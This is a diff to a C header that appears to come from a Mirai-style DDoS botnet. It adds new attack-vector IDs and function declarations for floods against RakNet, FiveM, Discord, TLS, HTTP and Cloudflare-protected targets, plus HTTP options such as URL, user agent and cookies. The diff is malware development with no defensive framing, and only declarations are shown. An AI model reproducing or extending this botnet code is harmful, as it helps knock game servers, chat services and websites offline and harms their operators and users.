@@ -40,6 +40,17 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_STD        12 
 #define ATK_VEC_LEGIT      13 
 #define ATK_VEC_SOCKET     14 
+#define ATK_VEC_RAKNET     15 
+#define ATK_VEC_ESP        16 
+#define ATK_VEC_UDPHEX     17 
+#define ATK_VEC_FIVEM      18 
+#define ATK_VEC_DISCORD    19 
+#define ATK_VEC_HTTP       20 
+#define ATK_VEC_PPS        21 
+#define ATK_VEC_TLS        22 
+#define ATK_VEC_TLSPLUS    23 
+#define ATK_VEC_CLOUDFLARE 24 
+#define ATK_VEC_NERV_L7    25 
 
 #define ATK_OPT_PAYLOAD_SIZE    0   
 #define ATK_OPT_PAYLOAD_RAND    1   
@@ -63,6 +74,11 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_OPT_GRE_CONSTIP     19  
 #define ATK_OPT_SOURCE          25  
 #define ATK_OPT_RAND_LEN        26  
+#define ATK_OPT_URL             27  
+#define ATK_OPT_HTTP_PATH       28  
+#define ATK_OPT_USERAGENT       29  
+#define ATK_OPT_HTTPS           30  
+#define ATK_OPT_COOKIES         31  
 
 struct attack_method {
     ATTACK_FUNC func;
@@ -89,6 +105,7 @@ void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_opti
 void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_raknet(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 void attack_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
@@ -103,6 +120,16 @@ void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_optio
 void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_esp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_udp_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_fivem(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_discord(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_pps(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_tls(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_tlsplus(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_cloudflare(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_nerv_l7(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
